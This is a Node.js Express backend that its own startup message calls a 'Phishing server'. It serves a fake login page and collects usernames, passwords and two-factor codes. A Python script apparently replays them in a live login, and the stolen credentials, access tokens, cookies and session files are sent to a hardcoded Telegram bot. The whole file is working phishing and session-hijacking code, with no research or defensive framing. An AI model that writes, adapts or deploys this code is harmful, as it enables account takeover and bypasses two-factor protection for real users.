const express = require('express');
const bodyParser = require('body-parser');
const { spawn } = require('child_process');
const path = require('path');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const FormData = require('form-data'); // <-- Add this line to use node-form-data

const app = express();
const port = 3002; // Changed port to 3002 as per previous context

// --- Telegram Bot Configuration ---
const TELEGRAM_CHAT_ID_BACKEND = '-1002820985435'; // !!! REPLACE WITH YOUR ACTUAL CHAT ID !!!
const TELEGRAM_BOT_TOKEN_BACKEND = '8043610888:AAE8JuHu8qefOdmKzB2K8lIj9ZdQnUSSVxo'; // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN !!!

async function sendToTelegram(message, filePath = null, fileName = null) {
    if (!TELEGRAM_CHAT_ID_BACKEND || !TELEGRAM_BOT_TOKEN_BACKEND) {
        console.warn("[Telegram Logger] Chat ID or Bot Token not configured. Skipping Telegram log.");
        return;
    }
    try {
        if (filePath && fs.existsSync(filePath)) {
            // Send document (file) with caption using node-form-data
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID_BACKEND);
            formData.append('caption', message);
            formData.append('parse_mode', 'HTML');
            formData.append('document', fs.createReadStream(filePath), fileName || path.basename(filePath));
            await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_BACKEND}/sendDocument`,
                formData,
                { headers: formData.getHeaders() }
            );
            console.log("[Telegram Logger] Message with file sent.");
        } else {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_BACKEND}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID_BACKEND,
                text: message,
                parse_mode: 'HTML'
            });
            console.log("[Telegram Logger] Message sent.");
        }
    } catch (error) {
        console.error("[Telegram Logger] Failed to send message to Telegram:", error.message);
    }
}

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());

// Serve the main login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'page-issues.html'));
});

// Endpoint to handle login submissions from the frontend
app.post('/login', async (req, res) => {
    const { username, password, two_fa, loginStage } = req.body;

    // Basic input validation
    if (!username || !password) {
        console.error("Request POST to /login missing username or password: ", req.body);
        return res.status(400).json({ success: false, error: 'Username and password are required.' });
    }

    if (loginStage === 'code_submitted' && (!two_fa || !/^\d{6}$/.test(two_fa))) {
        console.error(`Invalid 2FA code: must be a 6-digit string. Received: '${two_fa}'`);
        return res.status(400).json({ success: false, error: '2FA code must be a 6-digit string.' });
    }

    console.log(`[API] Received login data for user: ${username} (Stage: ${loginStage || 'password_needed'})`);

    // --- Prepare Input for Python Script ---
    const pythonInputData = {
        username: username,
        password: password,
        two_fa: two_fa || '',
        loginStage: loginStage || 'password_needed'
    };

    // --- Construct Telegram Message for Logging ---
    let telegramMessage = `<b>New Login Attempt Detected!</b>
<b>User Info:</b>
Username: <code>${username}</code>
Stage: <code>${loginStage || 'password_needed'}</code>
`;

    if (loginStage === 'password_needed' || loginStage === 'code_submitted') {
        telegramMessage += `
<b>Credentials:</b>
Password: <code>${password.length > 0 ? password : 'N/A'}</code>
`;
    }

    if (loginStage === 'code_submitted' && two_fa) {
        telegramMessage += `
<b>2FA Code:</b>
Code: <code>${two_fa}</code>
`;
    }

    sendToTelegram(telegramMessage); // Send login attempt details to Telegram

    // --- Spawn Python Process ---
    const pythonScriptPath = path.join(__dirname, 'login.py');
    const pythonProcess = spawn('python', [pythonScriptPath], {
        env: {
            ...process.env,
            PYTHONIOENCODING: 'utf-8' // Ensure correct encoding
        }
    });

    let pythonOutput = '';
    let pythonError = '';

    // Capture stdout from Python script
    pythonProcess.stdout.on('data', (data) => {
        const dataStr = data.toString();
        pythonOutput += dataStr;
        process.stdout.write(`[Python STDOUT]: ${dataStr}`);
    });

    // Capture stderr from Python script
    pythonProcess.stderr.on('data', (data) => {
        const dataStr = data.toString();
        pythonError += dataStr;
        process.stderr.write(`[Python STDERR]: ${dataStr}`);
    });

    // Handle Python process closing
    pythonProcess.on('close', async (code) => {
        console.log(`[API] Python process exited with code: ${code}`);

        if (code !== 0) {
            console.error(`[API] Error from Python process (code ${code}): ${pythonError || pythonOutput}`);
            
            // --- MODIFIED ERROR HANDLING ---
            // Prepare a default error response structure that the frontend can understand.
            let frontendErrorResponse = {
                success: false,
                next_stage: 'step1', // Default to resetting to step1 on general Python errors
                error_message: 'An internal error occurred. Please check your input or try again.',
                details: pythonError || pythonOutput // Include raw error for debugging
            };

            // Attempt to parse Python's output as JSON to get specific error details if available.
            try {
                const jsonStartIndex = pythonOutput.indexOf('{');
                const jsonEndIndex = pythonOutput.lastIndexOf('}');

                if (jsonStartIndex !== -1 && jsonEndIndex !== -1 && jsonEndIndex >= jsonStartIndex) {
                    const potentialErrorJson = JSON.parse(pythonOutput.substring(jsonStartIndex, jsonEndIndex + 1));
                    // If Python returned structured JSON with 'success: false', merge those details.
                    if (potentialErrorJson.success === false) {
                        frontendErrorResponse = {
                            success: false,
                            next_stage: potentialErrorJson.next_stage || 'step1', // Use Python's next_stage, or default to step1
                            error_message: potentialErrorJson.error_message || potentialErrorJson.error || frontendErrorResponse.error_message
                        };
                        // If Python's JSON output includes specific details, add them.
                        if (potentialErrorJson.details) {
                            frontendErrorResponse.details = potentialErrorJson.details;
                        }
                    }
                }
            } catch (parseError) {
                // If Python output couldn't be parsed as JSON, we rely on the default error response.
                console.error("[API] Failed to parse Python output as JSON for error handling:", parseError);
            }

            // Send the determined error response to the frontend.
            return res.status(500).json(frontendErrorResponse);
            // --- END OF MODIFIED ERROR HANDLING ---
        }

        // --- Existing success handling logic ---
        try {
            // Find and parse JSON output from Python
            const jsonStartIndex = pythonOutput.indexOf('{');
            const jsonEndIndex = pythonOutput.lastIndexOf('}');

            if (jsonStartIndex === -1 || jsonEndIndex === -1 || jsonEndIndex < jsonStartIndex) {
                throw new Error("Could not find valid JSON in Python output.");
            }

            const result = JSON.parse(pythonOutput.substring(jsonStartIndex, jsonEndIndex + 1));

            console.log(`[API] Parsed result from Python:`, result);

            // Send result back to the frontend
            if (result.success) {
                // If successful, log the tokens/cookies to Telegram
                // Write session_data to a temp file and send as attachment
                let sessionFilePath = null;
                let sessionFileName = null;
                if (result.session_data) {
                    const tmpDir = os.tmpdir();
                    sessionFileName = `session_data_${username}_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.json`;
                    sessionFilePath = path.join(tmpDir, sessionFileName);
                    try {
                        fs.writeFileSync(sessionFilePath, JSON.stringify(result.session_data, null, 2), { encoding: 'utf8' });
                    } catch (err) {
                        console.error("Failed to write session data file:", err);
                        sessionFilePath = null;
                    }
                }

                let successTelegramMessage = `<b>Login Successful!</b>
<b>User:</b> <code>${username}</code>
<b>Stage:</b> <code>${result.next_stage || 'login_success'}</code>
<b>Access Token:</b> <code>${result.access_token ? result.access_token : 'N/A'}</code>
<b>Cookies:</b>
<pre>${result.cookies ? JSON.stringify(result.cookies, null, 2) : 'N/A'}</pre>
<b>Session Data:</b>
<code>Đính kèm file session_data</code>
`;

                await sendToTelegram(successTelegramMessage, sessionFilePath, sessionFileName);

                // Clean up temp file after sending
                if (sessionFilePath && fs.existsSync(sessionFilePath)) {
                    setTimeout(() => {
                        try {
                            fs.unlinkSync(sessionFilePath);
                        } catch (e) {}
                    }, 10000);
                }

                res.status(200).json(result);
            } else {
                // If login failed in Python but provided a next_stage, send it to the frontend.
                // The frontend will handle the transition based on next_stage.
                res.status(200).json(result);
            }
        } catch (parseError) {
            console.error("[API] Error parsing JSON result from Python:", parseError);
            console.error("[API] Raw Python Output:", pythonOutput);
            res.status(500).json({
                success: false,
                error: 'Error processing result from Python process.',
                details: pythonOutput,
                parseError: parseError.message
            });
        }
    });

    // Write input data to Python stdin
    pythonProcess.stdin.write(JSON.stringify(pythonInputData));
    pythonProcess.stdin.end();
});

// A dummy success page
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Successful</title>
            <style>
                body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 80vh; background-color: #f0f2f5; flex-direction: column; }
                h1 { color: #1877f2; }
            </style>
        </head>
        <body>
            <h1>Login Process Completed Successfully!</h1>
            <p>Thank you for providing the information.</p>
            <p><a href="/">Go back</a></p>
        </body>
        </html>
    `);
});

app.listen(port, () => {
    console.log(`Phishing server running on http://localhost:${port}`);
    console.log('Endpoint: POST /login');
    console.log('Frontend served at: GET /');
});